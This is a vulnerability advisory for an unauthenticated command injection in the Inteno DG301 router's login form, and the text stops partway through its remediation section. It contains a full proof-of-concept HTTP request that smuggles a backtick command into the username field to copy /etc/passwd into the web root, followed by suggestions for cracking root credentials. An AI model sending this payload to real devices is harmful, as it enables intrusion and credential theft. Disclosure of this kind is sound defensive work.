1.    Background

According to the vendor, Inteno DG301 is a high-end Multi-WAN
residential gateway with advanced router and bridge functions.


2.    Summary

Inteno DG301 Powered by LuCI Trunk (inteno-1.0.34) and OpenWrt Backfire
10.03.1-RC6 is vulnerable to command injection, which can be exploited
directly from the login form on the web interface.

The vulnerability could be exploited by unauthenticated attackers.
Successful exploitation would allow attackers to execute arbitrary
commands with root privileges.


3.    Affected Products

DG301 Powered by LuCI Trunk (inteno-1.0.34) and OpenWrt Backfire
10.03.1-RC6.
Other products or previous versions may also be vulnerable.


4.    Vulnerability and Proof of Concept (PoC)

The login form presented on the web administration interface (username
parameter) is vulnerable to command injection, due to the application
does not validate the user input in a proper manner.

The following PoC includes a POST request that should be sent to the
device via web. The request includes a command that will copy the
contents of "/etc/passwd" to a file "test.txt" on the root web folder
were the web administration interface is published.

POST /cgi-bin/luci HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 Gecko/20100101 Firefox
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: sysauth=55f19d843ebf2de094b8a8a2acf5c3a7; sysauth=
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

username=user`cp%20/etc/passwd%20/www/test.txt`&password=pass

After the request is sent, proceed to visit http://<routerIP>/test.txt.
This should display the contents of "/etc/passwd", including the root
password in encrypted (DES) form. From here, the root credentials could
be cracked in a reasonable amount of time. This attack could also be
used for enabling services (e.g. SSH), or running any other arbitrary
commands.


5.    Remediation

The vendor has released a new firmware version - 1.6.8RC3.
Users are encouraged to update their devices in order to patch the
